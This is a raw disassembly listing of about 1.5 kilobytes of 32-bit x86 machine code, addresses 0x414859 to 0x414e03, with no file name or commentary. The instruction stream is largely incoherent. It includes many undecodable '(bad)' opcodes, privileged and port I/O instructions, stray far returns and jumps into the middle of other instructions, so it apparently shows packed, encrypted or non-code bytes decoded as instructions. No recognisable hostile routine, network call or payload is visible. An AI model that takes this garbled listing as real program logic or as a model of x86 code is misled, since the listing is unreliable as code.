  414859:	64 a9 83 42 7a d1    	fs test $0xd17a4283,%eax
  41485f:	41                   	inc    %ecx
  414860:	cb                   	lret
  414861:	b1 81                	mov    $0x81,%cl
  414863:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  414864:	26 53                	es push %ebx
  414866:	67 ca 41 c5          	addr16 lret $0xc541
  41486a:	e2 53                	loop   0x4148bf
  41486c:	06                   	push   %es
  41486d:	d6                   	salc
  41486e:	3b e4                	cmp    %esp,%esp
  414870:	31 4d 27             	xor    %ecx,0x27(%ebp)
  414873:	03 7f 2c             	add    0x2c(%edi),%edi
  414876:	87 21                	xchg   %esp,(%ecx)
  414878:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  414879:	b2 2c                	mov    $0x2c,%dl
  41487b:	2e 8b 78 14          	mov    %cs:0x14(%eax),%edi
  41487f:	03 78 b4             	add    -0x4c(%eax),%edi
  414882:	77 74                	ja     0x4148f8
  414884:	41                   	inc    %ecx
  414885:	6a 2b                	push   $0x2b
  414887:	b0 d1                	mov    $0xd1,%al
  414889:	7f 16                	jg     0x4148a1
  41488b:	01 06                	add    %eax,(%esi)
  41488d:	cf                   	iret
  41488e:	78 83                	js     0x414813
  414890:	68 30 b1 ca f3       	push   $0xf3cab130
  414895:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  414896:	ca 33 59             	lret   $0x5933
  414899:	02 9e 88 ed 58 eb    	add    -0x14a71278(%esi),%bl
  41489f:	da c6                	fcmovb %st(6),%st
  4148a1:	0c e5                	or     $0xe5,%al
  4148a3:	3d 74 2c 6a 61       	cmp    $0x616a2c74,%eax
  4148a8:	77 78                	ja     0x414922
  4148aa:	1e                   	push   %ds
  4148ab:	40                   	inc    %eax
  4148ac:	ce                   	into
  4148ad:	59                   	pop    %ecx
  4148ae:	04 0e                	add    $0xe,%al
  4148b0:	b6 87                	mov    $0x87,%dh
  4148b2:	59                   	pop    %ecx
  4148b3:	48                   	dec    %eax
  4148b4:	74 b7                	je     0x41486d
  4148b6:	10 ec                	adc    %ch,%ah
  4148b8:	1b de                	sbb    %esi,%ebx
  4148ba:	ba d8 d6 06 37       	mov    $0x3706d6d8,%edx
  4148bf:	cd 46                	int    $0x46
  4148c1:	ba 5c f0 28 f9       	mov    $0xf928f05c,%edx
  4148c6:	40                   	inc    %eax
  4148c7:	61                   	popa
  4148c8:	a8 77                	test   $0x77,%al
  4148ca:	fb                   	sti
  4148cb:	7e 21                	jle    0x4148ee
  4148cd:	83 e9 40             	sub    $0x40,%ecx
  4148d0:	57                   	push   %edi
  4148d1:	b9 40 25 26 ab       	mov    $0xab262540,%ecx
  4148d6:	ba 03 56 72 75       	mov    $0x75725603,%edx
  4148db:	0d 2c d5 3b aa       	or     $0xaa3bd52c,%eax
  4148e0:	d0 1c 71             	rcrb   $1,(%ecx,%esi,2)
  4148e3:	8f                   	(bad)
  4148e4:	60                   	pusha
  4148e5:	4f                   	dec    %edi
  4148e6:	0c 64                	or     $0x64,%al
  4148e8:	f1                   	int1
  4148e9:	17                   	pop    %ss
  4148ea:	e2 bd                	loop   0x4148a9
  4148ec:	cf                   	iret
  4148ed:	27                   	daa
  4148ee:	ed                   	in     (%dx),%eax
  4148ef:	8a 1a                	mov    (%edx),%bl
  4148f1:	2b cb                	sub    %ebx,%ecx
  4148f3:	7e 0b                	jle    0x414900
  4148f5:	ec                   	in     (%dx),%al
  4148f6:	c6 43 35 8e          	movb   $0x8e,0x35(%ebx)
  4148fa:	d1 69 5a             	shrl   $1,0x5a(%ecx)
  4148fd:	d8 cb                	fmul   %st(3),%st
  4148ff:	5b                   	pop    %ebx
  414900:	1c b6                	sbb    $0xb6,%al
  414902:	9b                   	fwait
  414903:	4d                   	dec    %ebp
  414904:	f8                   	clc
  414905:	ba 9c f0 dd 53       	mov    $0x53ddf09c,%edx
  41490a:	13 3e                	adc    (%esi),%edi
  41490c:	1d da 97 5f 2a       	sbb    $0x2a5f97da,%eax
  414911:	1d 1e 7a 82 48       	sbb    $0x48827a1e,%eax
  414916:	08 7d 09             	or     %bh,0x9(%ebp)
  414919:	03 88 11 3c 6b 10    	add    0x106b3c11(%eax),%ecx
  41491f:	4b                   	dec    %ebx
  414920:	80 0c cf d2          	orb    $0xd2,(%edi,%ecx,8)
  414924:	27                   	daa
  414925:	5a                   	pop    %edx
  414926:	0e                   	push   %cs
  414927:	4b                   	dec    %ebx
  414928:	76 b6                	jbe    0x4148e0
  41492a:	e2 ca                	loop   0x4148f6
  41492c:	12 c9                	adc    %cl,%cl
  41492e:	c8 c9 4b 2d          	enter  $0x4bc9,$0x2d
  414932:	76 46                	jbe    0x41497a
  414934:	e9 c6 2b a1 8d       	jmp    0x8de274ff
  414939:	3b 51 83             	cmp    -0x7d(%ecx),%edx
  41493c:	d8 51 ff             	fcoms  -0x1(%ecx)
  41493f:	79 98                	jns    0x4148d9
  414941:	27                   	daa
  414942:	6b a1 a1 81 1b 5a a3 	imul   $0xffffffa3,0x5a1b81a1(%ecx),%esp
  414949:	ec                   	in     (%dx),%al
  41494a:	4b                   	dec    %ebx
  41494b:	f0 2c de             	lock sub $0xde,%al
  41494e:	7e 81                	jle    0x4148d1
  414950:	78 fa                	js     0x41494c
  414952:	83 c9 58             	or     $0x58,%ecx
  414955:	f2 ae                	repnz scas %es:(%edi),%al
  414957:	f7 d1                	not    %ecx
  414959:	49                   	dec    %ecx
  41495a:	0b 5a 2b             	or     0x2b(%edx),%ebx
  41495d:	d1 e8                	shr    $1,%eax
  41495f:	62 46 95             	bound  %eax,-0x6b(%esi)
  414962:	02 13                	add    (%ebx),%dl
  414964:	63 d7                	arpl   %edx,%edi
  414966:	25 9a 2a 56 36       	and    $0x36562a9a,%eax
  41496b:	aa                   	stos   %al,%es:(%edi)
  41496c:	b7 7c                	mov    $0x7c,%bh
  41496e:	96                   	xchg   %eax,%esi
  41496f:	8d 87 36 f1 45 3d    	lea    0x3d45f136(%edi),%eax
  414975:	00 14 18             	add    %dl,(%eax,%ebx,1)
  414978:	8d 7f b4             	lea    -0x4c(%edi),%edi
  41497b:	d0 a4 df 16 fa 52 bb 	shlb   $1,-0x44ad05ea(%edi,%ebx,8)
  414982:	14 92                	adc    $0x92,%al
  414984:	db 2c 35 54 c7 de c9 	fldt   -0x362138ac(,%esi,1)
  41498b:	c1 e8 93             	shr    $0x93,%eax
  41498e:	67 8d                	addr16 lea (bad),%ebp
  414990:	ef                   	out    %eax,(%dx)
  414991:	05 74 24 15 0f       	add    $0xf152474,%eax
  414996:	92                   	xchg   %eax,%edx
  414997:	17                   	pop    %ss
  414998:	9e                   	sahf
  414999:	55                   	push   %ebp
  41499a:	63 3f                	arpl   %edi,(%edi)
  41499c:	2f                   	das
  41499d:	bb 04 10 04 80       	mov    $0x80041004,%ebx
  4149a2:	45                   	inc    %ebp
  4149a3:	34 56                	xor    $0x56,%al
  4149a5:	c3                   	ret
  4149a6:	f7 d8                	neg    %eax
  4149a8:	47                   	inc    %edi
  4149a9:	7d ae                	jge    0x414959
  4149ab:	e4 39                	in     $0x39,%al
  4149ad:	b2 42                	mov    $0x42,%dl
  4149af:	43                   	inc    %ebx
  4149b0:	f9                   	stc
  4149b1:	e0 f9                	loopne 0x4149ac
  4149b3:	bc fb 01 79 c8       	mov    $0xc87901fb,%esp
  4149b8:	f9                   	stc
  4149b9:	c3                   	ret
  4149ba:	db 2d 5e 31 c3 d9    	fldt   0xd9c3315e
  4149c0:	ee                   	out    %al,(%dx)
  4149c1:	c3                   	ret
  4149c2:	83 4c f6 60 83       	orl    $0xffffff83,0x60(%esi,%esi,8)
  4149c7:	80 ff 7f             	cmp    $0x7f,%bh
  4149ca:	09 3f                	or     %edi,(%edi)
  4149cc:	a0 20 0f 39 c8       	mov    0xc8390f20,%al
  4149d1:	02 40 c8             	add    -0x38(%eax),%al
  4149d4:	05 fa 08 f2 20       	add    $0x20f208fa,%eax
  4149d9:	0f f2 40 9c          	pslld  -0x64(%eax),%mm0
  4149dd:	0c 50                	or     $0x50,%al
  4149df:	c3                   	ret
  4149e0:	0f 24 f4             	mov    %tr6,%esp
  4149e3:	12 f9                	adc    %cl,%bh
  4149e5:	c9                   	leave
  4149e6:	4f                   	dec    %edi
  4149e7:	7e 80                	jle    0x414969
  4149e9:	96                   	xchg   %eax,%esi
  4149ea:	98                   	cwtl
  4149eb:	16                   	push   %ss
  4149ec:	20 bc be 19 28 6b ee 	and    %bh,-0x1194d7e7(%esi,%edi,4)
  4149f3:	1c 3c                	sbb    $0x3c,%al
  4149f5:	f2 23 3f             	repnz and (%edi),%edi
  4149f8:	f9                   	stc
  4149f9:	02 95 20 40 b7 43    	add    0x43b74020(%ebp),%dl
  4149ff:	ba 23 10 a5 d4       	mov    $0xd4a51023,%edx
  414a04:	f7 9f df 36 35 85    	negl   -0x7acac921(%edi)
  414a0a:	0e                   	push   %cs
  414a0b:	13 2a                	adc    (%edx),%ebp
  414a0d:	e7 84                	out    %eax,$0x84
  414a0f:	91                   	xchg   %eax,%ecx
  414a10:	2a 80 f4 20 e6 b5    	sub    -0x4a19df0c(%eax),%al
  414a16:	2d 09 f9 cf 7f       	sub    $0x7fcff909,%eax
  414a1b:	fe                   	(bad)
  414a1c:	a0 31 a9 5f e3       	mov    0xe35fa931,%al
  414a21:	30 04 bf             	xor    %al,(%edi,%edi,4)
  414a24:	c9                   	leave
  414a25:	1b 8e 34 c5 2e bc    	sbb    -0x43d13acc(%esi),%ecx
  414a2b:	a2 b1 37 bf f9       	mov    %al,0xf9bf37b1
  414a30:	9b                   	fwait
  414a31:	bf 40 76 3a 6b       	mov    $0x6b3a7640,%edi
  414a36:	0b de                	or     %esi,%ebx
  414a38:	3a e8                	cmp    %al,%ch
  414a3a:	89 04 23             	mov    %eax,(%ebx,%eiz,1)
  414a3d:	c7                   	(bad)
  414a3e:	8a 3e                	mov    (%esi),%bh
  414a40:	62 ac c5 eb 78 ad e5 	bound  %ebp,-0x1a528715(%ebp,%eax,8)
  414a47:	bf fc 97 41 80       	mov    $0x804197fc,%edi
  414a4c:	7a 17                	jp     0x414a65
  414a4e:	b7 26                	mov    $0x26,%bh
  414a50:	d7                   	xlat   %ds:(%ebx)
  414a51:	d8 44 90 ac          	fadds  -0x54(%eax,%edx,4)
  414a55:	6e                   	outsb  %ds:(%esi),(%dx)
  414a56:	32 78 86             	xor    -0x7a(%eax),%bh
  414a59:	87 48 fd             	xchg   %ecx,-0x3(%eax)
  414a5c:	ff 2f                	ljmp   *(%edi)
  414a5e:	ff b4 57 0a 3f 16 68 	push   0x68163f0a(%edi,%edx,2)
  414a65:	a9 4b a1 ed cc       	test   $0xcceda14b,%eax
  414a6a:	ce                   	into
  414a6b:	1b c2                	sbb    %edx,%eax
  414a6d:	d3 4e 40             	rorl   %cl,0x40(%esi)
  414a70:	a0 84 14 40 61       	mov    0x61401484,%al
  414a75:	51                   	push   %ecx
  414a76:	59                   	pop    %ecx
  414a77:	84 e3                	test   %ah,%bl
  414a79:	5f                   	pop    %edi
  414a7a:	f8                   	clc
  414a7b:	6f                   	outsl  %ds:(%esi),(%dx)
  414a7c:	52                   	push   %edx
  414a7d:	c8 a5 19 90          	enter  $0x19a5,$0x90
  414a81:	b9 a5 6f a5 36       	mov    $0x36a56fa5,%ecx
  414a86:	3a 0f                	cmp    (%edi),%cl
  414a88:	20 f4                	and    %dh,%ah
  414a8a:	27                   	daa
  414a8b:	8f                   	(bad)
  414a8c:	cb                   	lret
  414a8d:	1d ff ff bf 44       	sbb    $0x44bfffff,%eax
  414a92:	8f 09 94 f8          	(bad)
  414a96:	78 39                	js     0x414ad1
  414a98:	3f                   	aas
  414a99:	81 5c 40 e5 0b b9 36 	sbbl   $0xd736b90b,-0x1b(%eax,%eax,2)
  414aa0:	d7 
  414aa1:	07                   	pop    %es
  414aa2:	8f                   	(bad)
  414aa3:	a1 5f 40 df 4e       	mov    0x4edf405f,%eax
  414aa8:	ff                   	(bad)
  414aa9:	ff                   	(bad)
  414aaa:	ff                   	(bad)
  414aab:	ff 67 04             	jmp    *0x4(%edi)
  414aae:	cd c9                	int    $0xc9
  414ab0:	f2 c9                	repnz leave
  414ab2:	62 40 96             	bound  %eax,-0x6a(%eax)
  414ab5:	22 81 45 40 7c 6f    	and    0x6f7c4045(%ecx),%al
  414abb:	fc                   	cld
  414abc:	65 40                	gs inc %eax
  414abe:	9e                   	sahf
  414abf:	b5 70                	mov    $0x70,%ch
  414ac1:	2b a8 ad c5 9d 69    	sub    0x699dc5ad(%eax),%ebp
  414ac7:	40                   	inc    %eax
  414ac8:	d5 a6                	aad    $0xa6
  414aca:	cf                   	iret
  414acb:	ff                   	(bad)
  414acc:	ff                   	(bad)
  414acd:	7f a9                	jg     0x414a78
  414acf:	ed                   	in     (%dx),%eax
  414ad0:	49                   	dec    %ecx
  414ad1:	1f                   	pop    %ds
  414ad2:	78 5a                	js     0x414b2e
  414ad4:	40                   	inc    %eax
  414ad5:	cd 9b                	int    $0x9b
  414ad7:	c5 16                	lds    (%esi),%edx
  414ad9:	ab                   	stos   %eax,%es:(%edi)
  414ada:	b3 ef                	mov    $0xef,%bl
  414adc:	3d 41 e0 8c e9       	cmp    $0xe98ce041,%eax
  414ae1:	80 c9 47             	or     $0x47,%cl
  414ae4:	ff                   	(bad)
  414ae5:	ff                   	(bad)
  414ae6:	ff                   	(bad)
  414ae7:	ff                   	(bad)
  414ae8:	ba 93 a8 41 aa       	mov    $0xaa41a893,%edx
  414aed:	17                   	pop    %ss
  414aee:	e6 7f                	out    %al,$0x7f
  414af0:	2b a1 16 b6 12 42    	sub    0x4212b616(%ecx),%esp
  414af6:	6b 55 27 39          	imul   $0x39,0x27(%ebp),%edx
  414afa:	8d                   	lea    (bad),%esi
  414afb:	f7 70 e0             	divl   -0x20(%eax)
  414afe:	7c 42                	jl     0x414b42
  414b00:	30 c9                	xor    %cl,%cl
  414b02:	3c e3                	cmp    $0xe3,%al
  414b04:	ff 96 52 8a ff ff    	call   *-0x75ae(%esi)
  414b0a:	7f e1                	jg     0x414aed
  414b0c:	e7 42                	out    %eax,$0x42
  414b0e:	8e 9d 9d fb eb 7e    	mov    0x7eebfb9d(%ebp),%ds
  414b14:	aa                   	stos   %al,%es:(%edi)
  414b15:	51                   	push   %ecx
  414b16:	43                   	inc    %ebx
  414b17:	8c 2f                	mov    %gs,(%edi)
  414b19:	6a 5c                	push   $0x5c
  414b1b:	19 fc                	sbb    %edi,%esp
  414b1d:	26 d2 bb 43 76 e3 cc 	sarb   %cl,%es:-0x331c89bd(%ebx)
  414b24:	f2 29 ff             	repnz sub %edi,%edi
  414b27:	ff                   	(bad)
  414b28:	ff                   	(bad)
  414b29:	ff 2f                	ljmp   *(%edi)
  414b2b:	84 81 26 44 d2 0a    	test   %al,0xad24426(%ecx)
  414b31:	90                   	nop
  414b32:	db 00                	fildl  (%eax)
  414b34:	27                   	daa
  414b35:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  414b36:	9f                   	lahf
  414b37:	90                   	nop
  414b38:	44                   	inc    %esp
  414b39:	17                   	pop    %ss
  414b3a:	aa                   	stos   %al,%es:(%edi)
  414b3b:	f8                   	clc
  414b3c:	ae                   	scas   %es:(%edi),%al
  414b3d:	10 e3                	adc    %ah,%bl
  414b3f:	c5 c4 fa             	(bad)
  414b42:	44                   	inc    %esp
  414b43:	59                   	pop    %ecx
  414b44:	9c                   	pushf
  414b45:	b0 e9                	mov    $0xe9,%al
  414b47:	07                   	pop    %es
  414b48:	9c                   	pushf
  414b49:	8a ff                	mov    %bh,%bh
  414b4b:	ff                   	(bad)
  414b4c:	ff                   	(bad)
  414b4d:	ff f2                	push   %edx
  414b4f:	64 45                	fs inc %ebp
  414b51:	d4 f3                	aam    $0xf3
  414b53:	f7 eb                	imul   %ebx
  414b55:	e1 4a                	loope  0x414ba1
  414b57:	7a 95                	jp     0x414aee
  414b59:	cf                   	iret
  414b5a:	45                   	inc    %ebp
  414b5b:	62 a2 95 07 dc d8    	bound  %esp,-0x2723f86b(%edx)
  414b61:	3e b8 39 46 c7 91    	ds mov $0x91c74639,%eax
  414b67:	0e                   	push   %cs
  414b68:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  414b69:	ae                   	scas   %es:(%edi),%al
  414b6a:	a0 19 e3 a3 b7       	mov    0xb7a3e319,%al
  414b6f:	fa                   	cli
  414b70:	ff                   	(bad)
  414b71:	ff 46 17             	incl   0x17(%esi)
  414b74:	0c 75                	or     $0x75,%al
  414b76:	81 86 75 76 c9 48 4d 	addl   $0x93a7e44d,0x48c97675(%esi)
  414b7d:	e4 a7 93 
  414b80:	39 3b                	cmp    %edi,(%ebx)
  414b82:	35 b8 b2 ed 53       	xor    $0x53edb2b8,%eax
  414b87:	fa                   	cli
  414b88:	3d c5 81 ff 7f       	cmp    $0x7fff81c5,%eax
  414b8d:	83 5d f4 9e          	sbbl   $0xffffff9e,-0xc(%ebp)
  414b91:	92                   	xchg   %eax,%edx
  414b92:	5a                   	pop    %edx
  414b93:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  414b94:	f0 a1 20 c0 54 a5    	lock mov 0xa554c020,%eax
  414b9a:	8c 37                	mov    %?,(%edi)
  414b9c:	61                   	popa
  414b9d:	8b 5a 8e             	mov    -0x72(%edx),%ebx
  414ba0:	37                   	aaa
  414ba1:	f8                   	clc
  414ba2:	ff                   	(bad)
  414ba3:	7f 25                	jg     0x414bca
  414ba5:	5d                   	pop    %ebp
  414ba6:	89 f9                	mov    %edi,%ecx
  414ba8:	db 67 f8             	(bad) -0x8(%edi)
  414bab:	f3 27                	repz daa
  414bad:	bf a2 c8 5d dd       	mov    $0xdd5dc8a2,%edi
  414bb2:	80 6e 9b 97          	subb   $0x97,-0x65(%esi)
  414bb6:	20 7a 52             	and    %bh,0x52(%edx)
  414bb9:	60                   	pusha
  414bba:	00 50 fa             	add    %dl,-0x6(%eax)
  414bbd:	ff c4                	inc    %esp
  414bbf:	25 75 f0 59 d5       	and    $0xd559f075,%eax
  414bc4:	6e                   	outsb  %ds:(%esi),(%dx)
  414bc5:	62 11                	bound  %edx,(%ecx)
  414bc7:	35 ae ca 7b 3e       	xor    $0x3e7bcaae,%eax
  414bcc:	e2 83                	loop   0x414b51
  414bce:	d8 d8                	fcomp  %st(0)
  414bd0:	bf f7 24 b5 c8       	mov    $0xc8b524f7,%edi
  414bd5:	72 64                	jb     0x414c3b
  414bd7:	a9 b1 12 dd 2b       	test   $0x2bdd12b1,%eax
  414bdc:	03 c8                	add    %eax,%ecx
  414bde:	99                   	cltd
  414bdf:	08 d1                	or     %dl,%cl
  414be1:	f2 30 00             	repnz xor %al,(%eax)
  414be4:	d6                   	salc
  414be5:	6a c2                	push   $0xffffffc2
  414be7:	9c                   	pushf
  414be8:	22 55 83             	and    -0x7d(%ebp),%dl
  414beb:	78 a3                	js     0x414b90
  414bed:	32 fe                	xor    %dh,%bh
  414bef:	b4 5c                	mov    $0x5c,%ah
  414bf1:	24 14                	and    $0x14,%al
  414bf3:	32 d4                	xor    %ah,%dl
  414bf5:	2d b6 78 18 0b       	sub    $0xb1878b6,%eax
  414bfa:	c9                   	leave
  414bfb:	c3                   	ret
  414bfc:	0b 70 5c             	or     0x5c(%eax),%esi
  414bff:	0b 6e dd             	or     -0x23(%esi),%ebp
  414c02:	f8                   	clc
  414c03:	b6 d7                	mov    $0xd7,%dh
  414c05:	58                   	pop    %eax
  414c06:	07                   	pop    %es
  414c07:	79 0a                	jns    0x414c13
  414c09:	f7 da                	neg    %edx
  414c0b:	ed                   	in     (%dx),%eax
  414c0c:	83 da 44             	sbb    $0x44,%edx
  414c0f:	cf                   	iret
  414c10:	01 37                	add    %esi,(%edi)
  414c12:	bd 7c d7 19 0d       	mov    $0xd19d77c,%ebp
  414c17:	d9 f7                	fincstp
  414c19:	db 83 d9 f7 01 8b    	fildl  -0x74fe0827(%ebx)
  414c1f:	57                   	push   %edi
  414c20:	87 cf                	xchg   %ecx,%edi
  414c22:	00 ff                	add    %bh,%bh
  414c24:	ff                   	(bad)
  414c25:	ff 77 39             	push   0x39(%edi)
  414c28:	33 f6                	xor    %esi,%esi
  414c2a:	d1 e0                	shl    $1,%eax
  414c2c:	d1 d2                	rcl    $1,%edx
  414c2e:	d1 d6                	rcl    $1,%esi
  414c30:	d1 d7                	rcl    $1,%edi
  414c32:	3b fd                	cmp    %ebp,%edi
  414c34:	72 0b                	jb     0x414c41
  414c36:	77 04                	ja     0x414c3c
  414c38:	3b f3                	cmp    %ebx,%esi
  414c3a:	72 05                	jb     0x414c41
  414c3c:	2b f3                	sub    %ebx,%esi
  414c3e:	1b fd                	sbb    %ebp,%edi
  414c40:	40                   	inc    %eax
  414c41:	e2 e7                	loop   0x414c2a
  414c43:	11 ac c1 e9 5b f7 c3 	adc    %ebp,-0x3c08a417(%ecx,%eax,8)
  414c4a:	b2 bc                	mov    $0xbc,%dl
  414c4c:	45                   	inc    %ebp
  414c4d:	e0 16                	loopne 0x414c65
  414c4f:	3b 03                	cmp    (%ebx),%eax
  414c51:	7a 71                	jp     0x414cc4
  414c53:	f7 f3                	div    %ebx
  414c55:	16                   	push   %ss
  414c56:	eb f3                	jmp    0x414c4b
  414c58:	fa                   	cli
  414c59:	db 42 d5             	fildl  -0x2b(%edx)
  414c5c:	c4 43 23             	les    0x23(%ebx),%eax
  414c5f:	03 08                	add    (%eax),%ecx
  414c61:	83 fe ff             	cmp    $0xffffffff,%esi
  414c64:	75 11                	jne    0x414c77
  414c66:	01 3f                	add    %edi,(%edi)
  414c68:	16                   	push   %ss
  414c69:	58                   	pop    %eax
  414c6a:	c9                   	leave
  414c6b:	0b 17                	or     (%edi),%edx
  414c6d:	fe                   	(bad)
  414c6e:	75 75                	jne    0x414ce5
  414c70:	05 1d cf 5d aa       	add    $0xaa5dcf1d,%eax
  414c75:	13 5c 5e ff          	adc    -0x1(%esi,%ebx,2),%ebx
  414c79:	1a 03                	sbb    (%ebx),%al
  414c7b:	96                   	xchg   %eax,%esi
  414c7c:	46                   	inc    %esi
  414c7d:	35 43 16 ec da       	xor    $0xdaec1643,%eax
  414c82:	23 c0                	and    %eax,%eax
  414c84:	a9 a7 2f 2b 25       	test   $0x252b2fa7,%eax
  414c89:	2c 91                	sub    $0x91,%al
  414c8b:	fd                   	std
  414c8c:	8b 88 5b 00 8a 7a    	mov    0x7a8a005b(%eax),%ecx
  414c92:	4c                   	dec    %esp
  414c93:	49                   	dec    %ecx
  414c94:	33 81 f2 5d 59 07    	xor    0x7595df2(%ecx),%eax
  414c9a:	2b 94 fc 82 ef 88 bf 	sub    -0x4077107e(%esp,%edi,8),%edx
  414ca1:	71 84                	jno    0x414c27
  414ca3:	74 53                	je     0x414cf8
  414ca5:	d8 f3                	fdiv   %st(3),%st
  414ca7:	92                   	xchg   %eax,%edx
  414ca8:	f4                   	hlt
  414ca9:	f2 a7                	repnz cmpsl %es:(%edi),%ds:(%esi)
  414cab:	39 42 0e             	cmp    %eax,0xe(%edx)
  414cae:	47                   	inc    %edi
  414caf:	cd 33                	int    $0x33
  414cb1:	2f                   	das
  414cb2:	c2 52 d9             	ret    $0xd952
  414cb5:	42                   	inc    %edx
  414cb6:	1f                   	pop    %ds
  414cb7:	00 8f 7f 2d 19 ba    	add    %cl,-0x45e6d281(%edi)
  414cbd:	c1 de 20             	rcr    $0x20,%esi
  414cc0:	7c 5c                	jl     0x414d1e
  414cc2:	2f                   	das
  414cc3:	05 b4 bb 65 a2       	add    $0xa265bbb4,%eax
  414cc8:	0d 4b aa d3 e2       	or     $0xe2d3aa4b,%eax
  414ccd:	06                   	push   %es
  414cce:	0f a5 1a             	shld   %cl,%ebx,(%edx)
  414cd1:	d5 27                	aad    $0x27
  414cd3:	bb 29 e0 c3 1b       	mov    $0x1bc3e029,%ebx
  414cd8:	06                   	push   %es
  414cd9:	c1 fa 1f             	sar    $0x1f,%edx
  414cdc:	12 47 76             	adc    0x76(%edi),%al
  414cdf:	db de                	fcmovnu %st(6),%st
  414ce1:	02 99 d3 f8 1b ad    	add    -0x52e4072d(%ecx),%bl
  414ce7:	23 fa                	and    %edx,%edi
  414ce9:	c3                   	ret
  414cea:	37                   	aaa
  414ceb:	c2 c0 81             	ret    $0x81c0
  414cee:	c6                   	(bad)
  414cef:	6e                   	outsb  %ds:(%esi),(%dx)
  414cf0:	06                   	push   %es
  414cf1:	d3 e8                	shr    %cl,%eax
  414cf3:	1b ea                	sbb    %edx,%ebp
  414cf5:	9b                   	fwait
  414cf6:	06                   	push   %es
  414cf7:	ea 41 76 d4 7e 59 ff 	ljmp   $0xff59,$0x7ed47641
  414cfe:	05 24 6c 20 62       	add    $0x62206c24,%eax
  414d03:	11 a1 37 a0 97 ee    	adc    %esp,-0x11685fc9(%ecx)
  414d09:	ae                   	scas   %es:(%edi),%al
  414d0a:	c8 cd 33 09          	enter  $0x33cd,$0x9
  414d0e:	64 c4 b8 0c 1f 21 87 	les    %fs:-0x78dee0f4(%eax),%edi
  414d15:	fd                   	std
  414d16:	45                   	inc    %ebp
  414d17:	60                   	pusha
  414d18:	b8 fc 03 09 ec       	mov    $0xec0903fc,%eax
  414d1d:	06                   	push   %es
  414d1e:	b8 c3 80 af 85       	mov    $0x85af80c3,%eax
  414d23:	51                   	push   %ecx
  414d24:	79 e7                	jns    0x414d0d
  414d26:	21 27                	and    %esp,(%edi)
  414d28:	7b f8                	jnp    0x414d22
  414d2a:	5d                   	pop    %ebp
  414d2b:	67 70 5a             	addr16 jo 0x414d88
  414d2e:	83 2d 33 10 63 f5 01 	subl   $0x1,0xf5631033
  414d35:	0f 83 bc 98 a3 c2    	jae    0xc2e4e5f7
  414d3b:	06                   	push   %es
  414d3c:	f6 c4 e6             	test   $0xe6,%ah
  414d3f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  414d40:	38 3c c6             	cmp    %bh,(%esi,%eax,8)
  414d43:	05 d7 02 06 6f       	add    $0x6f0602d7,%eax
  414d48:	89 cc                	mov    %ecx,%esp
  414d4a:	c9                   	leave
  414d4b:	43                   	inc    %ebx
  414d4c:	44                   	inc    %esp
  414d4d:	7d 05                	jge    0x414d54
  414d4f:	6b e8 9d             	imul   $0xffffff9d,%eax,%ebp
  414d52:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  414d53:	6b 00 08             	imul   $0x8,(%eax),%eax
  414d56:	fc                   	cld
  414d57:	01 91 ed 07 c0 d6    	add    %edx,-0x293ff813(%ecx)
  414d5d:	04 07                	add    $0x7,%al
  414d5f:	14 19                	adc    $0x19,%al
  414d61:	02 80 1a 91 66 6b    	add    0x6b66911a(%eax),%al
  414d67:	9b                   	fwait
  414d68:	e0 b8                	loopne 0x414d22
  414d6a:	3f                   	aas
  414d6b:	6b 09 e4             	imul   $0xffffffe4,(%ecx),%ecx
  414d6e:	b0 99                	mov    $0x99,%al
  414d70:	5b                   	pop    %ebx
  414d71:	51                   	push   %ecx
  414d72:	b0 e8                	mov    $0xe8,%al
  414d74:	13 f2                	adc    %edx,%esi
  414d76:	19 8c dc b1 43 f1 08 	sbb    %ecx,0x8f143b1(%esp,%ebx,8)
  414d7d:	bc c2 ec ba 7c       	mov    $0x7cbaecc2,%esp
  414d82:	9c                   	pushf
  414d83:	11 2d 8b ec f1 3d    	adc    %ebp,0x3df1ec8b
  414d89:	a2 0e fb d9 4f       	mov    %al,0x4fd9fb0e
  414d8e:	f8                   	clc
  414d8f:	ac                   	lods   %ds:(%esi),%al
  414d90:	a3 2c 0f 02 10       	mov    %eax,0x10020f2c
  414d95:	a3 28 09 3b 98       	mov    %eax,0x983b0928
  414d9a:	a3 20 ad 02 03       	mov    %eax,0x302ad20
  414d9f:	79 d8                	jns    0x414d79
  414da1:	f1                   	int1
  414da2:	77 5a                	ja     0x414dfe
  414da4:	d4 ec                	aam    $0xec
  414da6:	64 a1 60 d3 b0 ac    	mov    %fs:0xacb0d360,%eax
  414dac:	07                   	pop    %es
  414dad:	a2 41 06 19 a8       	mov    %al,0xa8190641
  414db2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  414db3:	a0 37 e4 0a 11       	mov    0x110ae437,%al
  414db8:	17                   	pop    %ss
  414db9:	56                   	push   %esi
  414dba:	2d ad 43 83 3d       	sub    $0x3d8343ad,%eax
  414dbf:	9f                   	lahf
  414dc0:	c4 1b                	les    (%ebx),%ebx
  414dc2:	a8 cc                	test   $0xcc,%al
  414dc4:	d2 7d 0a             	sarb   %cl,0xa(%ebp)
  414dc7:	b8 e2 32 23 ec       	mov    $0xec2332e2,%eax
  414dcc:	68 9e a2 27 7e       	push   $0x7e27a29e
  414dd1:	1b 6a 40             	sbb    0x40(%edx),%ebp
  414dd4:	f9                   	stc
  414dd5:	8c 5d 0c             	mov    %ds,0xc(%ebp)
  414dd8:	45                   	inc    %ebp
  414dd9:	ef                   	out    %eax,(%dx)
  414dda:	42                   	inc    %edx
  414ddb:	cb                   	lret
  414ddc:	1b 34 53             	sbb    (%ebx,%edx,2),%esi
  414ddf:	a1 30 a1 42 b8       	mov    0xb842a130,%eax
  414de4:	7f 6c                	jg     0x414e52
  414de6:	9c                   	pushf
  414de7:	89 1d dc 0b 23 14    	mov    %ebx,0x14230bdc
  414ded:	37                   	aaa
  414dee:	be 2e 62 c8 62       	mov    $0x62c8622e,%esi
  414df3:	05 1a 84 7a 28       	add    $0x287a841a,%eax
  414df8:	64 f6 6d a2          	imulb  %fs:-0x5e(%ebp)
  414dfc:	da 8b 15 c0 a7 82    	fimull -0x7d583feb(%ebx)
  414e02:	c3                   	ret
  414e03:	28 a4 19 b5 56 6e 6c 	sub    %ah,0x6c6e56b5(%ecx,%ebx,1)
